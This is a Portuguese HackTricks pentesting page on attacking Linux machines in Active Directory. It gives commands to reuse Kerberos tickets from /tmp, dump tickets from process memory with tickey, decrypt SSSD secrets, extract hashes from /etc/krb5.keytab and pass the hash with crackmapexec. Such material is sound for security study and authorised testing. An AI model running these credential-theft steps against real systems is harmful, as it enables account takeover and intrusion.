# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Uma máquina linux também pode estar presente dentro de um ambiente de Active Directory.

Uma máquina linux em um AD pode estar **armazenando diferentes tickets CCACHE dentro de arquivos. Esses tickets podem ser usados e abusados como qualquer outro ticket kerberos**. Para ler esses tickets, você precisará ser o proprietário do usuário do ticket ou **root** dentro da máquina.

## Enumeração

### Enumeração de AD a partir do linux

Se você tem acesso a um AD no linux (ou bash no Windows), você pode tentar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar o AD.

Você também pode verificar a seguinte página para aprender **outras maneiras de enumerar o AD a partir do linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA é uma **alternativa** de código aberto ao **Active Directory** da Microsoft, principalmente para ambientes **Unix**. Ele combina um **diretório LDAP completo** com um Centro de Distribuição de Chaves MIT **Kerberos** para gerenciamento semelhante ao Active Directory. Utilizando o Sistema de Certificados Dogtag para gerenciamento de certificados CA & RA, ele suporta autenticação **multi-fator**, incluindo cartões inteligentes. O SSSD é integrado para processos de autenticação Unix. Saiba mais sobre isso em:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Brincando com tickets

### Pass The Ticket

Nesta página, você vai encontrar diferentes lugares onde poderia **encontrar tickets kerberos dentro de um host linux**, na página seguinte você pode aprender como transformar esses formatos de tickets CCache em Kirbi (o formato necessário para uso no Windows) e também como realizar um ataque PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Reutilização de tickets CCACHE de /tmp

Arquivos CCACHE são formatos binários para **armazenar credenciais Kerberos** geralmente armazenados com permissões 600 em `/tmp`. Esses arquivos podem ser identificados pelo seu **formato de nome, `krb5cc_%{uid}`,** correlacionando com o UID do usuário. Para verificação de ticket de autenticação, a **variável de ambiente `KRB5CCNAME`** deve ser definida como o caminho do arquivo de ticket desejado, permitindo sua reutilização.

Liste o ticket atual usado para autenticação com `env | grep KRB5CCNAME`. O formato é portátil e o ticket pode ser **reutilizado configurando a variável de ambiente** com `export KRB5CCNAME=/tmp/ticket.ccache`. O formato do nome do ticket Kerberos é `krb5cc_%{uid}` onde uid é o UID do usuário.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Reutilização de bilhetes CCACHE a partir do keyring

**Os bilhetes Kerberos armazenados na memória de um processo podem ser extraídos**, especialmente quando a proteção ptrace da máquina está desativada (`/proc/sys/kernel/yama/ptrace_scope`). Uma ferramenta útil para esse fim é encontrada em [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita a extração ao injetar em sessões e despejar os bilhetes em `/tmp`.

Para configurar e usar essa ferramenta, os seguintes passos são seguidos:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimento tentará injetar em várias sessões, indicando o sucesso ao armazenar os tickets extraídos em `/tmp` com uma convenção de nomenclatura de `__krb_UID.ccache`.

### Reutilização de ticket CCACHE a partir do SSSD KCM

O SSSD mantém uma cópia do banco de dados no caminho `/var/lib/sss/secrets/secrets.ldb`. A chave correspondente é armazenada como um arquivo oculto no caminho `/var/lib/sss/secrets/.secrets.mkey`. Por padrão, a chave só é legível se você tiver permissões de **root**.

Invocar o \*\*`SSSDKCMExtractor` \*\* com os parâmetros --database e --key irá analisar o banco de dados e **descriptografar os segredos**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
O **blob de cache de credenciais Kerberos pode ser convertido em um arquivo CCache Kerberos utilizável** que pode ser passado para Mimikatz/Rubeus.

### Reutilização de ticket CCACHE a partir de keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extrair contas de /etc/krb5.keytab

As chaves de contas de serviço, essenciais para serviços que operam com privilégios de root, são armazenadas de forma segura nos arquivos **`/etc/krb5.keytab`**. Essas chaves, semelhantes a senhas para serviços, exigem confidencialidade estrita.

Para inspecionar o conteúdo do arquivo keytab, pode-se utilizar o **`klist`**. A ferramenta é projetada para exibir detalhes da chave, incluindo o **NT Hash** para autenticação do usuário, especialmente quando o tipo de chave é identificado como 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Para os usuários do Linux, o **`KeyTabExtract`** oferece funcionalidade para extrair o hash RC4 HMAC, que pode ser aproveitado para reutilização do hash NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
No macOS, **`bifrost`** atua como uma ferramenta para análise de arquivos keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando as informações da conta e do hash extraídas, conexões com servidores podem ser estabelecidas usando ferramentas como **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Referências
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
